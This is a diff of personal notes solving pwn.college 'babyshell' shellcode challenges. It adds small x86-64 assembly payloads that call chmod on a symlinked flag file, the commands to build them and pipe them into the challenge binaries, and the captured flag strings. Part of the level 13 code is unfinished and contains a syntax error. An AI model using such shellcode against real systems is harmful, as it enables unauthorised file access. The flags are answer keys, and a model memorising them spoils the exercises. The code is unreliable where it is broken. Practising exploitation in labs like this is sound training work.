@@ -535,14 +535,35 @@ pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}
 
 
 # 9
+.global _start
+.intel_syntax noprefix
+_start:
 
+    # load path Z to register
+    	xor rcx, rcx	 # 2 bytes
+	mov cl, 0x5A     # symlink to Z -> 2 bytes
+	push rcx	 # 1 byte
+	push rsp	 # 1 byte
 
+	# jmp here
+	jmp loop	 # at 9 bytes
+
+   	.rept 12
+	nop
+	.endr
+loop:
+	pop rdi
+	mov sil, 7          # set perm to 4
+    	mov al, 90         # chmod syscall
+	syscall
 
 gcc -nostdlib -o solve.elf shellchmod9.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level*
+
+pwn.college{kqV1J90sx9XiJzjjWAYxpYvBbeX.QX1IjMscTOxUzW}
 
 # 10
 # s file
@@ -596,14 +617,14 @@ pwn.college{8iBRHMjHGTdon1EduVvtaKd2nYe.QX3IjMscTOxUzW}
 _start:
 
     # load path f to register
-    	xor rcx, rcx
+    xor rcx, rcx
 	mov cl, 0x46     # symlink to Z
 	push rcx
 	push rsp
 	pop rdi
 
    	mov sil, 7          # set perm to 4
-    	mov al, 90         # chmod syscall
+    mov al, 90         # chmod syscall
 #	and al, 90
 	syscall
 
@@ -617,6 +638,37 @@ cat solve.bin | /challenge/babyshell_level*
 pwn.college{c9Bcqy0Vt5tKNSxTSQ1QcyYLwIz.QX4IjMscTOxUzW}
 
 # 13
+# stage1 
+.global _start
+_start:
+.intel_syntax noprefix
+	xor rax, rax
+	xor rdi, rdi			#stdin is fd 0
+	#lea rsi, [rip+where_to_read] 	#read into 
+    
+    mov cl 0x46         # 46 -> F
+    push rcx            #changed for smaller read
+    push rsp
+    pop rdi
+	
+    mov rdx, 1024 			#buf -> how much to read
+	syscall #triggers syscall
+
+
+where_to_read:
+	.ascii "F"
+	nop
+
+
+gcc -nostdlib -o solve.elf shellstage1.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level13
+
+
+
+
 mov al, 90
 syscall
 
